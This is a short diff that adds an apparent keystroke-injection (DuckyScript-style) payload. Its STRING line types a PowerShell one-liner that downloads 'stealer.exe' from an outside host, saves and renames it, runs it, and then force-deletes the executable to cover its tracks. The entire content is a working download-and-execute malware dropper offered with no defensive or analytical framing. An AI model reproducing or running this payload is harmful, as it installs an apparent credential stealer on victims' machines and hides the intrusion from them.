@@ -1,0 +1,2 @@
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $r = Invoke-WebRequest -Uri 'https://datachief.club/stealer.exe' -UseBasicParsing; [System.IO.File]::WriteAllBytes('.\hidden.dat', $r.Content); Rename-Item -Path '.\hidden.dat' -NewName 'haxor.exe'; Start-Process '.\haxor.exe'; Start-Sleep -Seconds 5; Remove-Item -Path '.\haxor.exe' -Force; exit
+ENTER
